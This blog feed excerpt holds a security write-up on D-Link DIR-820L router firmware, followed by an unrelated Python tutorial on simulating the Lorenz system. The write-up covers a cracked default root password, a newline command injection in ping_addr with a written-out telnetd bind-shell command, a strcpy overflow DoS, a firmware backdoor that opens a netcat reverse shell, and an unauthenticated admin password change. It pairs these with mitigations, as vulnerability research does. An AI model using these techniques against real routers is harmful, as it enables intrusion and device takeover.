<p>The need for security in the IoT sector is growing along with the growth of IoT. Security within IoT is important as there&rsquo;s much bigger consequences if a critical IoT device is hacked compared to a website being hacked. If some IoT devices that&rsquo;s being used for critical purposes such as health monitoring or ICS operation, compromise of such systems could lead to devastating physical consequences. In the worst case, it could endanger human life.</p>
<p>In this blog post, I&rsquo;ll be diving into IoT security analysis. I&rsquo;ll work on the <a href="https://legacy.us.dlink.com/pages/product.aspx?id=00c2150966b046b58ba95d8ae3a8f73d">D-Link DIR-820L</a> router. Their firmware is available <a href="https://legacyfiles.us.dlink.com/DIR-820L/REVA/FIRMWARE/DIR-820L_REVA_FIRMWARE_1.06B02.ZIP">here</a>.</p>
<h2 id="lab-environment">Lab environment</h2>
<p>I&rsquo;m analyzing this firmware in Ubuntu 18.04. Here are the tools I&rsquo;ll use.</p>
<ul>
<li><a href="https://github.com/ReFirmLabs/binwalk">Binwalk</a></li>
<li><a href="https://github.com/devttys0/sasquatch">Sasquatch</a></li>
<li><a href="https://github.com/qemu/qemu">QEMU</a></li>
<li><a href="https://github.com/pr0v3rbs/FirmAE">FirmAE</a></li>
<li><a href="https://github.com/rampageX/firmware-mod-kit">Firmware mod kit</a></li>
<li><a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra</a></li>
<li><a href="https://portswigger.net/burp">Burp Suite</a></li>
</ul>
<h3 id="binwalk">Binwalk</h3>
<p><code>binwalk</code> is used to analyze the firmware and identify the embedded files and file systems within the firmware. It allows us to locate partitions and archives, analyze the entropy of the file, and extract the segments.</p>
<h3 id="sasquatch">Sasquatch</h3>
<p><code>sasquatch</code> is used for unpacking a SquashFS file system. This is basically an improved version of <code>unsquashfs</code>.</p>
<h3 id="qemu">QEMU</h3>
<p>A full-system emulator and virtualizer that supports a wide range of different hardware architectures. It offers multi-architecture emulation, which is useful for embedded devices, which mostly uses ARM-based or MIPS-based architectures. It also offers networking configurations and debugging support.</p>
<h3 id="firmae">FirmAE</h3>
<p>This is a framework that streamlines end-to-end IoT firmware analysis. It automates firmware extraction and unpacking (by utilizing tools like <code>binwalk</code> and <code>sasquatch</code>). It uses heuristics to get CPU architecture for QEMU, which has been pre-configured. It also setup networking which allows us to access the device&rsquo;s web interface without actually owning the device.</p>
<h3 id="firmware-mod-kit">Firmware mod kit</h3>
<p>This tool extracts the underlying file system in the firmware, which allows for modification. This tool can also rebuild the modified firmware into a binary file.</p>
<h3 id="ghidra">Ghidra</h3>
<p><code>ghidra</code> is a reverse engineering framework with support for multiple different architectures such as x86_64, ARM, MIPS, etc.</p>
<h3 id="burp-suite">Burp Suite</h3>
<p>This is a web security analyzer. It contains many different features that allows analysis of HTTP requests.</p>
<h2 id="firmware-analysis">Firmware analysis</h2>
<p>Binwalk analysis shows a hidden SquashFS file system in the firmware. There&rsquo;s also extra LZMA compressed data inside the firmware too. The SquashFS file system is commonly used on embedded devices. It&rsquo;s mostly used for the root partition as having it read-only ensure the device can&rsquo;t easily brick itself.</p>

    <img src="/img/dir820l-security/dir820l-binwalk-results.png"  alt="Binwalk result"  class="center"  style="padding: 10px"  />


<p>Using the extraction feature of binwalk, we can extract the underlying SquashFS file system.</p>

    <img src="/img/dir820l-security/dir820l-squashfs-file-system.png"  alt="SquashFS file system"  class="center"  style="padding: 10px"  />


<p>The <code>shadow</code> file contains the password hash of the root user. Running this through <code>john</code> gives us the root password, which is <code>root</code>, very insecure.</p>

    <img src="/img/dir820l-security/dir820l-shadow-cracked.png"  alt="Cracked root password"  class="center"  style="padding: 10px"  />


<p>A quick analysis of the <code>rcS</code> startup file shows that the firmware will initialize <code>bulkListen</code> and <code>ncc2</code> when it starts up. The <code>ncc2</code> service is used for processing <a href="https://en.wikipedia.org/wiki/Common_Gateway_Interface">Common Gateway Interface (CGI)</a> requests. CGI is an interface specification that enables web servers to execute external programs to process HTTP and HTTPS requests. We can find the <code>ncc2</code> binary in <code>/sbin</code>.</p>

    <img src="/img/dir820l-security/dir820l-ncc2-sbin.png"  alt="sbin/ncc2 file"  class="center"  style="padding: 10px"  />


<p>We can also learn that the firmware runs on a 32-bit MIPSEB architecture. Originally I was planning to use IDA for reverse engineering but since IDA Pro is required for analysis of any architecture that isn&rsquo;t x86_64, I opted for Ghidra, which is open source and has support for the MIPS architecture.</p>
<p>Running this binary through <code>checksec</code> also shows that this binary doesn&rsquo;t have contain any overflow protection mechanism. It also doesn&rsquo;t contain any debugging symbols, which means it has been stripped, which will make the reverse engineering process a bit harder.</p>

    <img src="/img/dir820l-security/checksec-ncc2.png"  alt="ncc2 checksec"  class="center"  style="padding: 10px"  />


<h2 id="exploits">Exploits</h2>
<p>I&rsquo;ll cover 4 different exploits for this device.</p>
<h3 id="command-injection-in-ping-diagnostic">Command injection in ping diagnostic</h3>
<p>This vulnerability has been identified in the <code>ncc2</code> service (<code>/sbin/ncc2</code>) of the D-Link DIR-820L. Within the <code>ncc2</code> service, there&rsquo;s a functionality called <code>ping.ccp</code>, which allows for performing &ldquo;ping&rdquo; diagnostics.</p>

    <img src="/img/dir820l-security/dir-ncc2-ping-check-screen.png"  alt="ping check screen"  class="center"  style="padding: 10px"  />


<p>Captured request in Burp Suite:</p>

    <img src="/img/dir820l-security/dir-ping-check-burp-suite.png"  alt="ping check request in burp suite"  class="center"  style="padding: 10px"  />


<p>The function <code>FUN_0049e128</code> is responsible for processing POST requests to <code>ping.ccp</code>. This function gets the ping address through the request&rsquo;s <code>ping_addr</code> variable.</p>

    <img src="/img/dir820l-security/cve-2024-51186-request-processing.png"  alt="ping request handler"  class="center"  style="padding: 10px"  />


<p>The ping address is ran through the <code>hasInjectionString</code> function, which was imported from <code>libleopard.so</code>. This function checks for the existence of the following 4 characters: &ldquo;`&rdquo;, &ldquo;\&rdquo;, &ldquo;;&rdquo;, &ldquo;&rsquo;&rdquo;, &ldquo;|&rdquo;. If any of these characters are found in the user input, the request won&rsquo;t be processed.</p>

    <img src="/img/dir820l-security/hasinjectionstring-function.png"  alt="hasInjectionString function"  class="center"  style="padding: 10px"  />


<p>This <code>hasInjectionString</code> function did not check for all possible command separators. It is possible to inject a command through the use of the newline character <code>\n</code> or <code>0x0A</code> in hex.</p>
<p>We can test the command injection by trying to send a GET request to our HTTP server through the router.</p>

    <img src="/img/dir820l-security/command-injection-dir-ping-cgi-wget-test.png"  alt="CMDi ping cgi wget test"  class="center"  style="padding: 10px"  />


<p>This works. Now, we can construct an exploit. We can use telnet to create a bind shell using this command.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>telnetd -l /bin/sh -p <span style="color:#ae81ff">9999</span> -b 0.0.0.0
</span></span></code></pre></div>
    <img src="/img/dir820l-security/command-injection-dir-ping-cgi-telnet-bind-shell.png"  alt="CMDi ping cgi telnet bind shell"  class="center"  style="padding: 10px"  />


<p>To mitigate this vulnerability, the <code>hasInjectionString</code> function black list needs to include more command separation characters.</p>
<h3 id="stack-overflow-dos-in-cancel-ping">Stack overflow DoS in cancel ping</h3>
<p>The function <code>FUN_0049e5b0</code> contains a stack overflow. When the function copies the string from the parameter <code>nextPage</code> to <code>acStack_118</code>, it uses <code>strcpy</code> and doesn&rsquo;t check the length of the string.</p>

    <img src="/img/dir820l-security/ping-ccp-cancel-ping-function.png"  alt="ping ccp cancel ping handler"  class="center"  style="padding: 10px"  />


<p>We can test for a buffer overflow DoS by entering a string over 256 characters long. I tested this and found that we need a string with a minimum of 288 characters to successfully DoS the router&rsquo;s <code>ncc2</code> service.</p>

    <img src="/img/dir820l-security/cancelPing-overflow-test.png"  alt="cancelPing overflow test"  class="center"  style="padding: 10px"  />


<p>To mitigate this, <code>FUN_0049e5b0</code> needs to implement some string length check or use <code>strncpy</code> for copying strings.</p>
<h3 id="firmware-modification">Firmware modification</h3>
<p>An exploit that can be performed if you have access to the physical device is a firmware modification attack. To do this, an attacker need to extract the firmware of the device, unpack the firmware, modify it, then flash the modified firmware on the device. Because the DIR-820L&rsquo;s firmware is available online, we can download it and modify it then flash it on a device later on.</p>
<p>Using Firmware Mod Kit, we can extract the firmware&rsquo;s SquashFS file system into <code>fmk/rootfs</code>.</p>

    <img src="/img/dir820l-security/fmk-rootfs-dir820l.png"  alt="fmk/rootfs of firmware"  class="center"  style="padding: 10px"  />


<p>Now, we can modify the <code>rcS</code> script in <code>/etc/init.d</code>, which is used to run additional programs at boot time as specified in <code>/etc/inittab</code>. We can modify this file with malicious instructions and execute malicious programs. I&rsquo;ll make it open up a telnet service on port 9999 for now.</p>

    <img src="/img/dir820l-security/dir820l-rcs-modification-telnet.png"  alt="rcS modification with telnet"  class="center"  style="padding: 10px"  />


<p>Now, we can build this firmware into a <code>bin</code> file.</p>

    <img src="/img/dir820l-security/dir820-build-new-firmware.png"  alt="modified firmware building"  class="center"  style="padding: 10px"  />


<p>With the new firmware, we can now flash the firmware onto the router. D-Link DIR routers allow for <a href="http://forums.dlink.com/index.php?topic=44909.0">emergency flash</a>. Since I don&rsquo;t have the device, I&rsquo;ll simulate the modified firmware instead.</p>

    <img src="/img/dir820l-security/dir820l-modified-fw-telnet.png"  alt="modified firmware telnet connection"  class="center"  style="padding: 10px"  />


<p>This is the <code>nmap</code> scan of the original, unmodified firmware.</p>

    <img src="/img/dir820l-security/dir820l-nmap-scan-orig-fw.png"  alt="nmap scan original firmware"  class="center"  style="padding: 10px"  />


<p>This is the <code>nmap</code> scan of the modified firmware. Port 9999 has been opened.</p>

    <img src="/img/dir820l-security/dir820l-nmap-scan-new-fw.png"  alt="nmap scan modified firmware"  class="center"  style="padding: 10px"  />


<p>This would only work if the attacker is in the same network as the router. To connect remotely over the Internet, we can insert a backdoor program which can open up a reverse shell to our server.</p>
<p><code>netcat</code> can be used for this. Unfortunately, the <code>busybox</code> that we have on the firmware doesn&rsquo;t have <code>netcat</code>. So we need to import a MIPSEB <code>busybox</code> that has <code>netcat</code> into the firmware and use that to create a reverse shell. I used this <a href="https://busybox.net/downloads/binaries/1.21.1/busybox-mips"><code>busybox</code></a> binary.</p>
<p>I imported the new <code>busybox</code> binary into the <code>/bin</code> directory and gave it executable permission. Now we can call this <code>busybox</code> to use <code>netcat</code>.</p>
<p>I made this very simple reverse shell script and stored it in <code>/bin</code>. It will check for Internet connection and will only open up a reverse shell if there&rsquo;s an Internet connection. If there is an Internet connection, it will try to establish a <code>netcat</code> connection to port 4444 or the specified IP address with <code>/bin/sh</code> as the exec file. I&rsquo;m using my LAN address here as I don&rsquo;t have a server.</p>

    <img src="/img/dir820l-security/dir820l-backdoor-script.png"  alt="backdoor script"  class="center"  style="padding: 10px"  />


<p>Now, when we try to emulate this firmware and get <code>netcat</code> to listen on port 4444 on our system, we can see that the backdoor works.</p>

    <img src="/img/dir820l-security/dir820l-backdoor-connection.png"  alt="backdoor connection"  class="center"  style="padding: 10px"  />


<p>To prevent this attack, the firmware can be encrypted to prevent reverse engineering and unpacking and incorporate TPM (Trusted Platform Module), which provides hardware-based encryption and decryption. The device could also use secure boot with a digitally signed firmware.</p>
<h3 id="insecure-access-control-in-password-change">Insecure access control in password change</h3>
<p>DIR-820L suffers from insecure access control in the admin account change password functionality of the router. Function <code>FUN_00451208</code> has been identified as the function responsible for accepting the CGI request for setting information.</p>

    <img src="/img/dir820l-security/ccp-act-set-conditional.png"  alt="ccp_act set conditional"  class="center"  style="padding: 10px"  />


<p>By default, the password is read from the file <code>defaultCfg.txt</code> stored in <code>sbin</code>. When the firmware is loaded and executed, the content of the default configuration files are then copied into <code>/var/tmp/cfg.txt</code>. Any modification to the configuration done by the admin will be applied to this <code>cfg.txt</code> file.</p>

    <img src="/img/dir820l-security/default-cfg-file-load-function.png"  alt="default cfg file load function"  class="center"  style="padding: 10px"  />


<p>The <code>ncc2</code> program does not perform any validation. This leads to insecure access control. An attacker could craft a packet to the <code>get_set.ccp</code> CGI handler without knowing the old password and still be able to change the password of the admin account. The <code>pure_SetDeviceSettings</code> function is most likely responsible for handling the admin password change functionality.</p>

    <img src="/img/dir820l-security/set-device-settings-function.png"  alt="set device settings function"  class="center"  style="padding: 10px"  />


<p>This function will use <code>sendEvent</code> to modify the configuration file in <code>/var/tmp</code>. Case 0 of <code>param_1</code> will call the <code>ncc_save_rtcfg</code> function.</p>

    <img src="/img/dir820l-security/send-event-load-rtcfg.png"  alt="sendEvent load rtcfg"  class="center"  style="padding: 10px"  />


<p>I could no find any method for checking for old password referenced within <code>ncc2</code>. Additionally, there&rsquo;s no user session validation in <code>ncc2</code> and the only cookie in the administration website is a binary cookie called <code>hasLogin</code>, no user session cookie. So it is safe to assume there is no user validation or old password validation in the password change functionality. Therefore, we can capture the request to change the password and modify the request to change the password. This request can be launched against other routers remotely.</p>

    <img src="/img/dir820l-security/password-get-set-ccp-request.png"  alt="password get_set.ccp request"  class="center"  style="padding: 10px"  />


<p>Sending this request to the router will change the router&rsquo;s configuration file to whatever the request specified. We can check the configuration file read in FirmAE&rsquo;s debug mode.</p>

    <img src="/img/dir820l-security/var-tmp-cfg-grep-login.png"  alt="grep /var/tmp/cfg.txt for login information"  class="center"  style="padding: 10px"  />


<p>To mitigate this, the devices needs to implement user session, which would prevent attackers from making unauthenticated requests. Currently, the device only sets a <code>hasLogin</code> binary cookie, which is not sufficient for user session validation. Additionally, the device needs to prompt the user for the old password before allowing them to change the password.</p>
<h2 id="conclusion">Conclusion</h2>
<p>IoT devices are in desperate need of better security. A compromised IoT device could lead to information disclosure in the best case, and death in the worst case. It is imperative that IoT security gets more attention as the consequences could be devastating.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.mdpi.com/1999-5903/17/1/19">IoT Firmware Emulation and Its Security Application in Fuzzing: A Critical Revisit</a></li>
<li><a href="https://syssec.kaist.ac.kr/pub/2020/kim_acsac2020.pdf">FirmAE: Towards Large-Scale Emulation of IoT Firmware for Dynamic Analysis</a></li>
<li><a href="https://code.google.com/archive/p/firmware-mod-kit/wikis/Documentation.wiki">firmware-mod-kit Documentation</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-51186">CVE-2024-51186</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-25281">CVE-2023-25281</a></li>
<li><a href="https://en.wikipedia.org/wiki/Blended_threat">Blended threat</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>The Lorenz System and The Butterfly Effect</title>
            <link>https://namberino.github.io/posts/2025/02/the-lorenz-system-and-the-butterfly-effect/</link>
            <pubDate>Sat, 15 Feb 2025 16:45:19 +0700</pubDate>
            
            <guid>https://namberino.github.io/posts/2025/02/the-lorenz-system-and-the-butterfly-effect/</guid>
            <description>&lt;p&gt;If you&amp;rsquo;ve ever seen a movie about time travel, you&amp;rsquo;ll probably have heard of the term &amp;ldquo;&lt;em&gt;The Butterfly Effect&lt;/em&gt;&amp;rdquo;. The Butterfly Effect got its name from a pretty interesting example: The flapping of a butterfly in the present can cause a hurricane in the future. It&amp;rsquo;s used extensively in time travel movies because if you somehow managed to time travel to the past and change the past, the future could be drastically altered from that small change due to how that small change compounded into bigger and bigger changes.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>If you&rsquo;ve ever seen a movie about time travel, you&rsquo;ll probably have heard of the term &ldquo;<em>The Butterfly Effect</em>&rdquo;. The Butterfly Effect got its name from a pretty interesting example: The flapping of a butterfly in the present can cause a hurricane in the future. It&rsquo;s used extensively in time travel movies because if you somehow managed to time travel to the past and change the past, the future could be drastically altered from that small change due to how that small change compounded into bigger and bigger changes.</p>
<p>This pop culture implication is quite consistent with the real-world implication of chaos theory: For a given system, small changes in its initial condition could result in massive difference in the system&rsquo;s evolution trajectory. These kinds of systems, which are highly sensitive to changes in the initial conditions, are <em>chaotic</em>.</p>
<p>I just want to be clear that chaotic systems are <strong>NOT</strong> random. Chaotic systems are deterministic. The evolution of these systems follow a unique pattern and is determined by their initial conditions. However, predictions of how the system will even in the long run is virtually impossible.</p>
<blockquote>
<p>&ldquo;Chaos: When the present determines the future, but the approximate present does not approximately determine the future&rdquo; - Edward Lorenz</p></blockquote>
<p>In order to get a closer look at chaos theory, we&rsquo;ll explore one of the most infamous chaotic system: The Lorenz system, developed by Edward Lorenz, one of the pioneers in chaos theory.</p>
<h2 id="atmospheric-convection">Atmospheric convection</h2>
<p>The Lorenz system was originally developed for modeling atmospheric convection, which is a process where heat and moisture is transported vertically through the atmosphere (Hot air goes up, cool air goes down). This rolling phenomenon occurs when the sun heats the air near Earth&rsquo;s surface than air higher in the atmosphere or over bodies of water.</p>
<p>We can imagine a pot boiling some water. As the water at the bottom heats up, it expands and and becomes less dense, causing it to rise. The cooler, denser water at the top sinks to replace it, creating a continuous &ldquo;rolling&rdquo; cycle of motion known as convection. This convection motion is highly chaotic as fluid flows have the potential to exhibit chaotic behaviors. Thus, a mathematical model is required to fully understand this chaotic systems.</p>
<p>Edward Lorenz managed to derive a simple set of 3 ordinary differential equations that describes the atmospheric convection. These nonlinear equations describes the complex and unpredictable nature of the convection phenomenon.</p>
<h2 id="the-lorenz-equations">The Lorenz equations</h2>
<p>The Lorenz system is described by these 3 ordinary differential equations:</p>
<p>$$
\begin{aligned}
\dot{x} &amp;= \sigma (y - x)
\\
\dot{y} &amp;= x (\rho - z) - y
\\
\dot{z} &amp;= x y - \beta z
\end{aligned}
$$</p>
<p>We can think of the system in a 3 dimensional plane. $x$, $y$, $z$ each representing the system&rsquo;s state its corresponding axis. $\sigma$, $\rho$, $\beta$ are system parameters that affect the evolution of the system. The output of the system is the instantaneous rate of change of the system in each axis. This derivative can then be used to update the system and describe how the system will continue evolving in time.</p>
<p>In the context of the atmospheric convection problem:</p>
<ul>
<li>$x$: Rate of convective motion in the fluid system</li>
<li>$y$: Variation in horizontal temperature in the fluid layer</li>
<li>$z$: Variation in vertical temperature in the fluid layer</li>
<li>$\sigma$: Ratio of fluid viscosity to thermal conductivity (Prandtl number)</li>
<li>$\rho$: The temperature difference driving the convection (Rayleigh number)</li>
<li>$\beta$: Aspect ratio of the convection cells</li>
</ul>
<p>These 3 equations are all ODEs, so we can solve them quite efficiently by using numerical methods like forward Euler, Runge-Kutta, etc.</p>
<h2 id="simulating-the-system">Simulating the system</h2>
<p>Let&rsquo;s simulate the Lorenz system with Python.</p>
<p>Prerequisites: <a href="https://scipy.org/"><em>scipy</em></a>, <a href="https://numpy.org/"><em>numpy</em></a>, <a href="https://matplotlib.org/"><em>matplotlib</em></a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> numpy <span style="color:#66d9ef">as</span> np
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> matplotlib.pyplot <span style="color:#66d9ef">as</span> plt
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> mpl_toolkits.mplot3d <span style="color:#f92672">import</span> Axes3D
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> scipy <span style="color:#f92672">import</span> integrate
</span></span></code></pre></div><p>We&rsquo;ll be using the <code>odeint</code> function from the <em>scipy</em> package in Python. This function allows us to solve ODEs efficiently. To use this function, we&rsquo;ll first need to specify a time span that the system will be simulated over. I&rsquo;ll set up a time span from 0 to 50 with a time step of 0.001, so the system will gradually go from time 0 to time 50 by stepping forward by 0.001 time.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>dt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.001</span> <span style="color:#75715e"># step</span>
</span></span><span style="display:flex;"><span>T <span style="color:#f92672">=</span> <span style="color:#ae81ff">50</span> <span style="color:#75715e"># range</span>
</span></span><span style="display:flex;"><span>t <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>arange(<span style="color:#ae81ff">0</span>, T <span style="color:#f92672">+</span> dt, dt) <span style="color:#75715e"># time span</span>
</span></span></code></pre></div><p>Next, we&rsquo;ll need to specify the starting condition of the system, which is the initial $x$, $y$, and $z$. We&rsquo;ll also need to specify the parameters for the system $\sigma$, $\rho$, $\beta$. Lorenz used the values $10$, $28$, $8/3$ for each of the parameters respectively, which will make the system exhibit chaotic behaviors.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># initial condition</span>
</span></span><span style="display:flex;"><span>x0 <span style="color:#f92672">=</span> (<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">20</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># parameters</span>
</span></span><span style="display:flex;"><span>sigma <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>beta <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>rho <span style="color:#f92672">=</span> <span style="color:#ae81ff">28</span>
</span></span></code></pre></div><p>Now the function <code>odeint</code> needs to know what the ODEs of interest are. So let&rsquo;s code up the 3 ODEs of the Lorenz system up in a function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">lorenz</span>(xyz, t0, sigma, beta, rho):
</span></span><span style="display:flex;"><span>    x, y, z <span style="color:#f92672">=</span> xyz <span style="color:#75715e"># current state</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    x_dot <span style="color:#f92672">=</span> sigma <span style="color:#f92672">*</span> (y <span style="color:#f92672">-</span> x)
</span></span><span style="display:flex;"><span>    y_dot <span style="color:#f92672">=</span> x <span style="color:#f92672">*</span> (rho <span style="color:#f92672">-</span> z) <span style="color:#f92672">-</span> y
</span></span><span style="display:flex;"><span>    z_dot <span style="color:#f92672">=</span> x <span style="color:#f92672">*</span> y <span style="color:#f92672">-</span> beta <span style="color:#f92672">*</span> z
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> [x_dot, y_dot, z_dot]
</span></span></code></pre></div><p>With all the conditions and equations set up, we can now use <code>odeint</code> to simulate the system. I&rsquo;ll use the relative tolerance (<code>rtol</code>) and absolute tolerance (<code>atol</code>) to limit error in the numerical integration. These tolerance values will ensure the error doesn&rsquo;t exceed the tolerance value and making the solution more accurate. Once the <code>odeint</code> is finished simulating the system, we&rsquo;ll get 3 vectors in return. The 3 vectors contain the values of $x$, $y$, and $z$ at each time step within the 0 to 50 time span.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># simulate system</span>
</span></span><span style="display:flex;"><span>x_t <span style="color:#f92672">=</span> integrate<span style="color:#f92672">.</span>odeint(lorenz, x0, t, (sigma, beta, rho), rtol<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span><span style="color:#f92672">**</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">12</span>), atol<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span><span style="color:#f92672">**</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">12</span>) <span style="color:#f92672">*</span> np<span style="color:#f92672">.</span>ones_like(x0))
</span></span><span style="display:flex;"><span>x, y, z <span style="color:#f92672">=</span> x_t<span style="color:#f92672">.</span>T
</span></span></code></pre></div><p>Once the simulation is done, we can plot the result to visualize the solution:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>fig <span style="color:#f92672">=</span> plt<span style="color:#f92672">.</span>figure()
</span></span><span style="display:flex;"><span>ax <span style="color:#f92672">=</span> fig<span style="color:#f92672">.</span>add_subplot(projection<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;3d&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ax<span style="color:#f92672">.</span>plot(x, y, z, linewidth<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>ax<span style="color:#f92672">.</span>scatter(x0[<span style="color:#ae81ff">0</span>], x0[<span style="color:#ae81ff">1</span>], x0[<span style="color:#ae81ff">2</span>], color<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;r&#39;</span>)
</span></span><span style="display:flex;"><span>ax<span style="color:#f92672">.</span>view_init(<span style="color:#ae81ff">10</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">50</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>show()
</span></span></code></pre></div><p>And the result is the beautiful chaotic behavior which kinda resembles the shape of a buttefly.</p>

    <img src="/img/lorenz-system/lorenz-system-plot-1.png"  alt="Lorenz system plot 1"  class="center"  style="padding: 10px"  />


<p>A fun thing we could do is plot the system with some color to make it look cooler. I&rsquo;ll set the background to black, remove the axes and the grid, and set the color map of the plot to go from blue to cyan.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> matplotlib.colors <span style="color:#66d9ef">as</span> mcolors
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>fig <span style="color:#f92672">=</span> plt<span style="color:#f92672">.</span>figure()
</span></span><span style="display:flex;"><span>ax <span style="color:#f92672">=</span> fig<span style="color:#f92672">.</span>add_subplot(projection<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;3d&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ax<span style="color:#f92672">.</span>set_facecolor(<span style="color:#e6db74">&#34;black&#34;</span>)
</span></span><span style="display:flex;"><span>fig<span style="color:#f92672">.</span>patch<span style="color:#f92672">.</span>set_facecolor(<span style="color:#e6db74">&#34;black&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cmap <span style="color:#f92672">=</span> mcolors<span style="color:#f92672">.</span>LinearSegmentedColormap<span style="color:#f92672">.</span>from_list(<span style="color:#e6db74">&#34;blue_cyan&#34;</span>, [<span style="color:#e6db74">&#34;blue&#34;</span>, <span style="color:#e6db74">&#34;cyan&#34;</span>])
</span></span><span style="display:flex;"><span>colors <span style="color:#f92672">=</span> cmap(np<span style="color:#f92672">.</span>linspace(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, len(x) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(x) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>    ax<span style="color:#f92672">.</span>plot(x[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>], y[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>], z[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>], color<span style="color:#f92672">=</span>colors[i], linewidth<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>ax<span style="color:#f92672">.</span>scatter(x0[<span style="color:#ae81ff">0</span>], x0[<span style="color:#ae81ff">1</span>], x0[<span style="color:#ae81ff">2</span>], color<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;r&#39;</span>, edgecolor<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;white&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ax<span style="color:#f92672">.</span>view_init(<span style="color:#ae81ff">10</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">50</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>axis(<span style="color:#e6db74">&#39;off&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>show()
</span></span></code></pre></div>
    <img src="/img/lorenz-system/lorenz-system-plot-2.png"  alt="Lorenz system plot 2"  class="center"  style="padding: 10px"  />


<p>Note how the system exhibit &ldquo;<em>rolling</em>&rdquo; behaviors, which is consistent with how atmostpheric convection works.</p>
<h2 id="conclusion">Conclusion</h2>
<p>That was a glimpse into the world of chaos theory. The Lorenz system showed how a system&rsquo;s behavior can vary drastically based on the initial condition. There are so many other dynamical systems, with many of them being chaotic. Chaos theory is a very exciting field and I hope this introduction will get you more excited and curious about this field.</p>
<p>Hope you enjoyed reading this blog post.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://databookuw.com/">Data-Driven Science and Engineering - Steven L. Brunton, J. Nathan Kutz</a></li>
<li><a href="https://en.wikipedia.org/wiki/Chaos_theory">Chaos theory - Wikipedia</a></li>
<li><a href="https://en.wikipedia.org/wiki/Lorenz_system">Lorenz system - Wikipedia</a></li>
<li><a href="https://science.howstuffworks.com/math-concepts/chaos-theory4.htm">How Chaos Theory Works - William Harris</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Let&#39;s make an HTTP server with Assembly</title>
